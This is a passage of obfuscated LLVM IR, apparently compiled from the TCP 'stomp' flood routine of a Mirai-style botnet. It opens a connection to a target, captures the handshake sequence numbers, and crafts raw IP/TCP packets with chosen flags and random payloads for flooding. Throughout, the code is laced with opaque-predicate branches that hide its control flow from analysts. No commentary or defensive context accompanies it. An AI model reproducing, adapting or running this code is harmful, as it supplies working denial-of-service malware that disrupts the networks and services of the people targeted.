  %257 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %258 = bitcast %struct.sockaddr_in* %27 to %struct.sockaddr*
  store %struct.sockaddr* %258, %struct.sockaddr** %257, align 8
  %259 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %260 = load %struct.sockaddr*, %struct.sockaddr** %259, align 8
  %261 = call i32 @connect(i32 %256, %struct.sockaddr* %260, i32 16)
  %262 = call i64 @time(i64* null) #6
  store i64 %262, i64* %31, align 8
  %263 = load i32, i32* @x.31
  %264 = load i32, i32* @y.32
  %265 = sub i32 %263, 1
  %266 = mul i32 %263, %265
  %267 = urem i32 %266, 2
  %268 = icmp eq i32 %267, 0
  %269 = icmp slt i32 %264, 10
  %270 = or i1 %268, %269
  br i1 %270, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %271

; <label>:271:                                    ; preds = %originalBBpart265, %originalBBpart216
  store i32 16, i32* %29, align 4
  %272 = load i32, i32* %10, align 4
  %273 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %274 = bitcast %union.__CONST_SOCKADDR_ARG* %34 to %struct.sockaddr**
  %275 = bitcast %struct.sockaddr_in* %28 to %struct.sockaddr*
  store %struct.sockaddr* %275, %struct.sockaddr** %274, align 8
  %276 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %34, i32 0, i32 0
  %277 = load %struct.sockaddr*, %struct.sockaddr** %276, align 8
  %278 = call i64 @recvfrom(i32 %272, i8* %273, i64 256, i32 16384, %struct.sockaddr* %277, i32* %29)
  %279 = trunc i64 %278 to i32
  store i32 %279, i32* %33, align 4
  %280 = load i32, i32* %33, align 4
  %281 = icmp eq i32 %280, -1
  br i1 %281, label %282, label %283

; <label>:282:                                    ; preds = %271
  br label %847

; <label>:283:                                    ; preds = %271
  %284 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %28, i32 0, i32 2
  %285 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %284, i32 0, i32 0
  %286 = load i32, i32* %285, align 4
  %287 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %288 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %287, i32 0, i32 0
  %289 = load i32, i32* %288, align 4
  %290 = icmp eq i32 %286, %289
  br i1 %290, label %291, label %610

; <label>:291:                                    ; preds = %283
  %292 = load i32, i32* %33, align 4
  %293 = sext i32 %292 to i64
  %294 = icmp ugt i64 %293, 40
  br i1 %294, label %295, label %610

; <label>:295:                                    ; preds = %291
  %296 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %297 = getelementptr inbounds i8, i8* %296, i64 20
  %298 = bitcast i8* %297 to %struct.tcphdr*
  store %struct.tcphdr* %298, %struct.tcphdr** %35, align 8
  %299 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %300 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %299, i32 0, i32 0
  %301 = load i16, i16* %300, align 4
  %302 = zext i16 %301 to i32
  %303 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %304 = load i16, i16* %303, align 2
  %305 = zext i16 %304 to i32
  %306 = icmp eq i32 %302, %305
  br i1 %306, label %307, label %609

; <label>:307:                                    ; preds = %295
  %308 = load i32, i32* @x.31
  %309 = load i32, i32* @y.32
  %310 = sub i32 %308, 1
  %311 = mul i32 %308, %310
  %312 = urem i32 %311, 2
  %313 = icmp eq i32 %312, 0
  %314 = icmp slt i32 %309, 10
  %315 = or i1 %313, %314
  br i1 %315, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %307
  %316 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %317 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %316, i32 0, i32 4
  %318 = load i16, i16* %317, align 4
  %319 = lshr i16 %318, 9
  %320 = and i16 %319, 1
  %321 = zext i16 %320 to i32
  %322 = icmp ne i32 %321, 0
  %323 = load i32, i32* @x.31
  %324 = load i32, i32* @y.32
  %325 = sub i32 %323, 1
  %326 = mul i32 %323, %325
  %327 = urem i32 %326, 2
  %328 = icmp eq i32 %327, 0
  %329 = icmp slt i32 %324, 10
  %330 = or i1 %328, %329
  br i1 %330, label %originalBBpart233, label %originalBB18alteredBB

originalBBpart233:                                ; preds = %originalBB18
  br i1 %322, label %331, label %556

; <label>:331:                                    ; preds = %originalBBpart233
  %332 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %333 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %332, i32 0, i32 4
  %334 = load i16, i16* %333, align 4
  %335 = lshr i16 %334, 12
  %336 = and i16 %335, 1
  %337 = zext i16 %336 to i32
  %338 = icmp ne i32 %337, 0
  br i1 %338, label %339, label %556

; <label>:339:                                    ; preds = %331
  %340 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %341 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %340, i32 0, i32 0
  %342 = load i32, i32* %341, align 4
  %343 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %344 = load i32, i32* %9, align 4
  %345 = sext i32 %344 to i64
  %346 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %343, i64 %345
  %347 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %346, i32 0, i32 0
  store i32 %342, i32* %347, align 4
  %348 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %349 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %348, i32 0, i32 2
  %350 = load i32, i32* %349, align 4
  %351 = call i32 @ntohl(i32 %350) #7
  %352 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %353 = load i32, i32* %9, align 4
  %354 = sext i32 %353 to i64
  %355 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %352, i64 %354
  %356 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %355, i32 0, i32 1
  store i32 %351, i32* %356, align 4
  %357 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %358 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %357, i32 0, i32 3
  %359 = load i32, i32* %358, align 4
  %360 = call i32 @ntohl(i32 %359) #7
  %361 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %362 = load i32, i32* %9, align 4
  %363 = sext i32 %362 to i64
  %364 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %361, i64 %363
  %365 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %364, i32 0, i32 2
  store i32 %360, i32* %365, align 4
  %366 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %367 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %366, i32 0, i32 1
  %368 = load i16, i16* %367, align 2
  %369 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %370 = load i32, i32* %9, align 4
  %371 = sext i32 %370 to i64
  %372 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %369, i64 %371
  %373 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %372, i32 0, i32 3
  store i16 %368, i16* %373, align 4
  %374 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %375 = load i16, i16* %374, align 2
  %376 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %377 = load i32, i32* %9, align 4
  %378 = sext i32 %377 to i64
  %379 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %376, i64 %378
  %380 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %379, i32 0, i32 4
  store i16 %375, i16* %380, align 2
  %381 = load i32, i32* %24, align 4
  %382 = sext i32 %381 to i64
  %383 = add i64 40, %382
  %384 = call noalias i8* @malloc(i64 %383) #6
  %385 = load i8**, i8*** %12, align 8
  %386 = load i32, i32* %9, align 4
  %387 = sext i32 %386 to i64
  %388 = getelementptr inbounds i8*, i8** %385, i64 %387
  store i8* %384, i8** %388, align 8
  %389 = load i8**, i8*** %12, align 8
  %390 = load i32, i32* %9, align 4
  %391 = sext i32 %390 to i64
  %392 = getelementptr inbounds i8*, i8** %389, i64 %391
  %393 = load i8*, i8** %392, align 8
  %394 = bitcast i8* %393 to %struct.iphdr*
  store %struct.iphdr* %394, %struct.iphdr** %36, align 8
  %395 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %396 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %395, i64 1
  %397 = bitcast %struct.iphdr* %396 to %struct.tcphdr*
  store %struct.tcphdr* %397, %struct.tcphdr** %37, align 8
  %398 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %399 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %398, i64 1
  %400 = bitcast %struct.tcphdr* %399 to i8*
  store i8* %400, i8** %38, align 8
  %401 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %402 = bitcast %struct.iphdr* %401 to i8*
  %403 = load i8, i8* %402, align 4
  %404 = and i8 %403, 15
  %405 = or i8 %404, 64
  store i8 %405, i8* %402, align 4
  %406 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %407 = bitcast %struct.iphdr* %406 to i8*
  %408 = load i8, i8* %407, align 4
  %409 = and i8 %408, -16
  %410 = or i8 %409, 5
  store i8 %410, i8* %407, align 4
  %411 = load i8, i8* %13, align 1
  %412 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %413 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %412, i32 0, i32 1
  store i8 %411, i8* %413, align 1
  %414 = load i32, i32* %24, align 4
  %415 = sext i32 %414 to i64
  %416 = add i64 40, %415
  %417 = trunc i64 %416 to i16
  %418 = call zeroext i16 @htons(i16 zeroext %417) #7
  %419 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %420 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %419, i32 0, i32 2
  store i16 %418, i16* %420, align 2
  %421 = load i16, i16* %14, align 2
  %422 = call zeroext i16 @htons(i16 zeroext %421) #7
  %423 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %424 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %423, i32 0, i32 3
  store i16 %422, i16* %424, align 4
  %425 = load i8, i8* %15, align 1
  %426 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %427 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %426, i32 0, i32 5
  store i8 %425, i8* %427, align 4
  %428 = load i8, i8* %16, align 1
  %429 = icmp ne i8 %428, 0
  br i1 %429, label %430, label %434

; <label>:430:                                    ; preds = %339
  %431 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %432 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %433 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %432, i32 0, i32 4
  store i16 %431, i16* %433, align 2
  br label %434

; <label>:434:                                    ; preds = %430, %339
  %435 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %436 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %435, i32 0, i32 6
  store i8 6, i8* %436, align 1
  %437 = load i32, i32* @LOCAL_ADDR, align 4
  %438 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %439 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %438, i32 0, i32 8
  store i32 %437, i32* %439, align 4
  %440 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %441 = load i32, i32* %9, align 4
  %442 = sext i32 %441 to i64
  %443 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %440, i64 %442
  %444 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %443, i32 0, i32 0
  %445 = load i32, i32* %444, align 4
  %446 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %447 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %446, i32 0, i32 9
  store i32 %445, i32* %447, align 4
  %448 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %449 = load i32, i32* %9, align 4
  %450 = sext i32 %449 to i64
  %451 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %448, i64 %450
  %452 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %451, i32 0, i32 3
  %453 = load i16, i16* %452, align 4
  %454 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %455 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %454, i32 0, i32 0
  store i16 %453, i16* %455, align 4
  %456 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %457 = load i32, i32* %9, align 4
  %458 = sext i32 %457 to i64
  %459 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %456, i64 %458
  %460 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %459, i32 0, i32 4
  %461 = load i16, i16* %460, align 2
  %462 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %463 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %462, i32 0, i32 1
  store i16 %461, i16* %463, align 2
  %464 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %465 = load i32, i32* %9, align 4
  %466 = sext i32 %465 to i64
  %467 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %464, i64 %466
  %468 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %467, i32 0, i32 2
  %469 = load i32, i32* %468, align 4
  %470 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %471 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %470, i32 0, i32 2
  store i32 %469, i32* %471, align 4
  %472 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %473 = load i32, i32* %9, align 4
  %474 = sext i32 %473 to i64
  %475 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %472, i64 %474
  %476 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %475, i32 0, i32 1
  %477 = load i32, i32* %476, align 4
  %478 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %479 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %478, i32 0, i32 3
  store i32 %477, i32* %479, align 4
  %480 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %481 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %480, i32 0, i32 4
  %482 = load i16, i16* %481, align 4
  %483 = and i16 %482, -241
  %484 = or i16 %483, 128
  store i16 %484, i16* %481, align 4
  %485 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %486 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %485, i32 0, i32 4
  %487 = load i16, i16* %486, align 4
  %488 = and i16 %487, -257
  %489 = or i16 %488, 256
  store i16 %489, i16* %486, align 4
  %490 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %491 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %490, i32 0, i32 4
  %492 = load i16, i16* %491, align 4
  %493 = and i16 %492, -4097
  %494 = or i16 %493, 4096
  store i16 %494, i16* %491, align 4
  %495 = call i32 @rand_next()
  %496 = and i32 %495, 65535
  %497 = trunc i32 %496 to i16
  %498 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %499 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %498, i32 0, i32 5
  store i16 %497, i16* %499, align 2
  %500 = load i8, i8* %18, align 1
  %501 = sext i8 %500 to i16
  %502 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %503 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %502, i32 0, i32 4
  %504 = load i16, i16* %503, align 4
  %505 = and i16 %501, 1
  %506 = shl i16 %505, 13
  %507 = and i16 %504, -8193
  %508 = or i16 %507, %506
  store i16 %508, i16* %503, align 4
  %509 = load i8, i8* %19, align 1
  %510 = sext i8 %509 to i16
  %511 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %512 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %511, i32 0, i32 4
  %513 = load i16, i16* %512, align 4
  %514 = and i16 %510, 1
  %515 = shl i16 %514, 12
  %516 = and i16 %513, -4097
  %517 = or i16 %516, %515
  store i16 %517, i16* %512, align 4
  %518 = load i8, i8* %20, align 1
  %519 = sext i8 %518 to i16
  %520 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %521 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %520, i32 0, i32 4
  %522 = load i16, i16* %521, align 4
  %523 = and i16 %519, 1
  %524 = shl i16 %523, 11
  %525 = and i16 %522, -2049
  %526 = or i16 %525, %524
  store i16 %526, i16* %521, align 4
  %527 = load i8, i8* %21, align 1
  %528 = sext i8 %527 to i16
  %529 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %530 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %529, i32 0, i32 4
  %531 = load i16, i16* %530, align 4
  %532 = and i16 %528, 1
  %533 = shl i16 %532, 10
  %534 = and i16 %531, -1025
  %535 = or i16 %534, %533
  store i16 %535, i16* %530, align 4
  %536 = load i8, i8* %22, align 1
  %537 = sext i8 %536 to i16
  %538 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %539 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %538, i32 0, i32 4
  %540 = load i16, i16* %539, align 4
  %541 = and i16 %537, 1
  %542 = shl i16 %541, 9
  %543 = and i16 %540, -513
  %544 = or i16 %543, %542
  store i16 %544, i16* %539, align 4
  %545 = load i8, i8* %23, align 1
  %546 = sext i8 %545 to i16
  %547 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %548 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %547, i32 0, i32 4
  %549 = load i16, i16* %548, align 4
  %550 = and i16 %546, 1
  %551 = shl i16 %550, 8
  %552 = and i16 %549, -257
  %553 = or i16 %552, %551
  store i16 %553, i16* %548, align 4
  %554 = load i8*, i8** %38, align 8
  %555 = load i32, i32* %24, align 4
  call void @rand_str(i8* %554, i32 %555)
  br label %651

; <label>:556:                                    ; preds = %331, %originalBBpart233
  %557 = load i32, i32* @x.31
  %558 = load i32, i32* @y.32
  %559 = sub i32 %557, 1
  %560 = mul i32 %557, %559
  %561 = urem i32 %560, 2
  %562 = icmp eq i32 %561, 0
  %563 = icmp slt i32 %558, 10
  %564 = or i1 %562, %563
  br i1 %564, label %originalBB35, label %originalBB35alteredBB

originalBB35:                                     ; preds = %originalBB35alteredBB, %556
  %565 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %566 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %565, i32 0, i32 4
  %567 = load i16, i16* %566, align 4
  %568 = lshr i16 %567, 8
  %569 = and i16 %568, 1
  %570 = zext i16 %569 to i32
  %571 = icmp ne i32 %570, 0
  %572 = load i32, i32* @x.31
  %573 = load i32, i32* @y.32
  %574 = sub i32 %572, 1
  %575 = mul i32 %572, %574
  %576 = urem i32 %575, 2
  %577 = icmp eq i32 %576, 0
  %578 = icmp slt i32 %573, 10
  %579 = or i1 %577, %578
  br i1 %579, label %originalBBpart244, label %originalBB35alteredBB

originalBBpart244:                                ; preds = %originalBB35
  br i1 %571, label %604, label %580

; <label>:580:                                    ; preds = %originalBBpart244
  %581 = load i32, i32* @x.31
  %582 = load i32, i32* @y.32
  %583 = sub i32 %581, 1
  %584 = mul i32 %581, %583
  %585 = urem i32 %584, 2
  %586 = icmp eq i32 %585, 0
  %587 = icmp slt i32 %582, 10
  %588 = or i1 %586, %587
  br i1 %588, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %580
  %589 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %590 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %589, i32 0, i32 4
  %591 = load i16, i16* %590, align 4
  %592 = lshr i16 %591, 10
  %593 = and i16 %592, 1
  %594 = zext i16 %593 to i32
  %595 = icmp ne i32 %594, 0
  %596 = load i32, i32* @x.31
  %597 = load i32, i32* @y.32
  %598 = sub i32 %596, 1
  %599 = mul i32 %596, %598
  %600 = urem i32 %599, 2
  %601 = icmp eq i32 %600, 0
  %602 = icmp slt i32 %597, 10
  %603 = or i1 %601, %602
  br i1 %603, label %originalBBpart257, label %originalBB46alteredBB

originalBBpart257:                                ; preds = %originalBB46
  br i1 %595, label %604, label %607

; <label>:604:                                    ; preds = %originalBBpart257, %originalBBpart244
  %605 = load i32, i32* %26, align 4
  %606 = call i32 @close(i32 %605)
  br label %185

; <label>:607:                                    ; preds = %originalBBpart257
  br label %608

; <label>:608:                                    ; preds = %607
  br label %609

; <label>:609:                                    ; preds = %608, %295
  br label %610

; <label>:610:                                    ; preds = %609, %291, %283
  %611 = call i64 @time(i64* null) #6
  %612 = load i64, i64* %31, align 8
  %613 = sub nsw i64 %611, %612
  %614 = icmp sgt i64 %613, 10
  br i1 %614, label %615, label %634

; <label>:615:                                    ; preds = %610
  %616 = load i32, i32* @x.31
  %617 = load i32, i32* @y.32
  %618 = sub i32 %616, 1
  %619 = mul i32 %616, %618
  %620 = urem i32 %619, 2
  %621 = icmp eq i32 %620, 0
  %622 = icmp slt i32 %617, 10
  %623 = or i1 %621, %622
  br i1 %623, label %originalBB59, label %originalBB59alteredBB

originalBB59:                                     ; preds = %originalBB59alteredBB, %615
  %624 = load i32, i32* %26, align 4
  %625 = call i32 @close(i32 %624)
  %626 = load i32, i32* @x.31
  %627 = load i32, i32* @y.32
  %628 = sub i32 %626, 1
  %629 = mul i32 %626, %628
  %630 = urem i32 %629, 2
  %631 = icmp eq i32 %630, 0
  %632 = icmp slt i32 %627, 10
  %633 = or i1 %631, %632
  br i1 %633, label %originalBBpart261, label %originalBB59alteredBB

originalBBpart261:                                ; preds = %originalBB59
  br label %185

; <label>:634:                                    ; preds = %610
  %635 = load i32, i32* @x.31
  %636 = load i32, i32* @y.32
  %637 = sub i32 %635, 1
  %638 = mul i32 %635, %637
  %639 = urem i32 %638, 2
  %640 = icmp eq i32 %639, 0
  %641 = icmp slt i32 %636, 10
  %642 = or i1 %640, %641
  br i1 %642, label %originalBB63, label %originalBB63alteredBB

originalBB63:                                     ; preds = %originalBB63alteredBB, %634
  %643 = load i32, i32* @x.31
  %644 = load i32, i32* @y.32
  %645 = sub i32 %643, 1
  %646 = mul i32 %643, %645
  %647 = urem i32 %646, 2
  %648 = icmp eq i32 %647, 0
  %649 = icmp slt i32 %644, 10
  %650 = or i1 %648, %649
  br i1 %650, label %originalBBpart265, label %originalBB63alteredBB

originalBBpart265:                                ; preds = %originalBB63
  br label %271

; <label>:651:                                    ; preds = %434
  %652 = load i32, i32* @x.31
  %653 = load i32, i32* @y.32
  %654 = sub i32 %652, 1
  %655 = mul i32 %652, %654
  %656 = urem i32 %655, 2
  %657 = icmp eq i32 %656, 0
  %658 = icmp slt i32 %653, 10
  %659 = or i1 %657, %658
  br i1 %659, label %originalBB67, label %originalBB67alteredBB

originalBB67:                                     ; preds = %originalBB67alteredBB, %651
  %660 = load i32, i32* @x.31
  %661 = load i32, i32* @y.32
  %662 = sub i32 %660, 1
  %663 = mul i32 %660, %662
  %664 = urem i32 %663, 2
  %665 = icmp eq i32 %664, 0
  %666 = icmp slt i32 %661, 10
  %667 = or i1 %665, %666
  br i1 %667, label %originalBBpart269, label %originalBB67alteredBB

originalBBpart269:                                ; preds = %originalBB67
  br label %668

; <label>:668:                                    ; preds = %originalBBpart269, %188
  %669 = load i32, i32* %9, align 4
  %670 = add nsw i32 %669, 1
  store i32 %670, i32* %9, align 4
  br label %163

; <label>:671:                                    ; preds = %163
  br label %672

; <label>:672:                                    ; preds = %846, %671
  %673 = load i32, i32* @x.31
  %674 = load i32, i32* @y.32
  %675 = sub i32 %673, 1
  %676 = mul i32 %673, %675
  %677 = urem i32 %676, 2
  %678 = icmp eq i32 %677, 0
  %679 = icmp slt i32 %674, 10
  %680 = or i1 %678, %679
  br i1 %680, label %originalBB71, label %originalBB71alteredBB

originalBB71:                                     ; preds = %originalBB71alteredBB, %672
  store i32 0, i32* %9, align 4
  %681 = load i32, i32* @x.31
  %682 = load i32, i32* @y.32
  %683 = sub i32 %681, 1
  %684 = mul i32 %681, %683
  %685 = urem i32 %684, 2
  %686 = icmp eq i32 %685, 0
  %687 = icmp slt i32 %682, 10
  %688 = or i1 %686, %687
  br i1 %688, label %originalBBpart273, label %originalBB71alteredBB

originalBBpart273:                                ; preds = %originalBB71
  br label %689

; <label>:689:                                    ; preds = %843, %originalBBpart273
  %690 = load i32, i32* @x.31
  %691 = load i32, i32* @y.32
  %692 = sub i32 %690, 1
  %693 = mul i32 %690, %692
  %694 = urem i32 %693, 2
  %695 = icmp eq i32 %694, 0
  %696 = icmp slt i32 %691, 10
  %697 = or i1 %695, %696
  br i1 %697, label %originalBB75, label %originalBB75alteredBB

originalBB75:                                     ; preds = %originalBB75alteredBB, %689
  %698 = load i32, i32* %9, align 4
  %699 = load i8, i8* %5, align 1
  %700 = zext i8 %699 to i32
  %701 = icmp slt i32 %698, %700
  %702 = load i32, i32* @x.31
  %703 = load i32, i32* @y.32
  %704 = sub i32 %702, 1
  %705 = mul i32 %702, %704
  %706 = urem i32 %705, 2
  %707 = icmp eq i32 %706, 0
  %708 = icmp slt i32 %703, 10
  %709 = or i1 %707, %708
  br i1 %709, label %originalBBpart277, label %originalBB75alteredBB

originalBBpart277:                                ; preds = %originalBB75
  br i1 %701, label %710, label %846

; <label>:710:                                    ; preds = %originalBBpart277
  %711 = load i32, i32* @x.31
  %712 = load i32, i32* @y.32
  %713 = sub i32 %711, 1
  %714 = mul i32 %711, %713
  %715 = urem i32 %714, 2
  %716 = icmp eq i32 %715, 0
  %717 = icmp slt i32 %712, 10
  %718 = or i1 %716, %717
  br i1 %718, label %originalBB79, label %originalBB79alteredBB

originalBB79:                                     ; preds = %originalBB79alteredBB, %710
  %719 = load i8**, i8*** %12, align 8
  %720 = load i32, i32* %9, align 4
  %721 = sext i32 %720 to i64
  %722 = getelementptr inbounds i8*, i8** %719, i64 %721
  %723 = load i8*, i8** %722, align 8
  store i8* %723, i8** %39, align 8
  %724 = load i8*, i8** %39, align 8
  %725 = bitcast i8* %724 to %struct.iphdr*
  store %struct.iphdr* %725, %struct.iphdr** %40, align 8
  %726 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %727 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %726, i64 1
  %728 = bitcast %struct.iphdr* %727 to %struct.tcphdr*
  store %struct.tcphdr* %728, %struct.tcphdr** %41, align 8
  %729 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %730 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %729, i64 1
  %731 = bitcast %struct.tcphdr* %730 to i8*
  store i8* %731, i8** %42, align 8
  %732 = load i16, i16* %14, align 2
  %733 = zext i16 %732 to i32
  %734 = icmp eq i32 %733, 65535
  %735 = load i32, i32* @x.31
  %736 = load i32, i32* @y.32
  %737 = sub i32 %735, 1
  %738 = mul i32 %735, %737
  %739 = urem i32 %738, 2
  %740 = icmp eq i32 %739, 0
  %741 = icmp slt i32 %736, 10
  %742 = or i1 %740, %741
  br i1 %742, label %originalBBpart281, label %originalBB79alteredBB

originalBBpart281:                                ; preds = %originalBB79
  br i1 %734, label %743, label %765

; <label>:743:                                    ; preds = %originalBBpart281
  %744 = load i32, i32* @x.31
  %745 = load i32, i32* @y.32
  %746 = sub i32 %744, 1
  %747 = mul i32 %744, %746
  %748 = urem i32 %747, 2
  %749 = icmp eq i32 %748, 0
  %750 = icmp slt i32 %745, 10
  %751 = or i1 %749, %750
  br i1 %751, label %originalBB83, label %originalBB83alteredBB

originalBB83:                                     ; preds = %originalBB83alteredBB, %743
  %752 = call i32 @rand_next()
  %753 = and i32 %752, 65535
  %754 = trunc i32 %753 to i16
  %755 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %756 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %755, i32 0, i32 3
  store i16 %754, i16* %756, align 4
  %757 = load i32, i32* @x.31
  %758 = load i32, i32* @y.32
  %759 = sub i32 %757, 1
  %760 = mul i32 %757, %759
  %761 = urem i32 %760, 2
  %762 = icmp eq i32 %761, 0
  %763 = icmp slt i32 %758, 10
  %764 = or i1 %762, %763
  br i1 %764, label %originalBBpart290, label %originalBB83alteredBB

originalBBpart290:                                ; preds = %originalBB83
  br label %765

; <label>:765:                                    ; preds = %originalBBpart290, %originalBBpart281
  %766 = load i8, i8* %25, align 1
  %767 = icmp ne i8 %766, 0
  br i1 %767, label %768, label %771

; <label>:768:                                    ; preds = %765
  %769 = load i8*, i8** %42, align 8
  %770 = load i32, i32* %24, align 4
  call void @rand_str(i8* %769, i32 %770)
  br label %771

; <label>:771:                                    ; preds = %768, %765
  %772 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %773 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %772, i32 0, i32 7
  store i16 0, i16* %773, align 2
  %774 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %775 = bitcast %struct.iphdr* %774 to i16*
  %776 = call zeroext i16 @checksum_generic(i16* %775, i32 20)
  %777 = load %struct.iphdr*, %struct.iphdr** %40, align 8
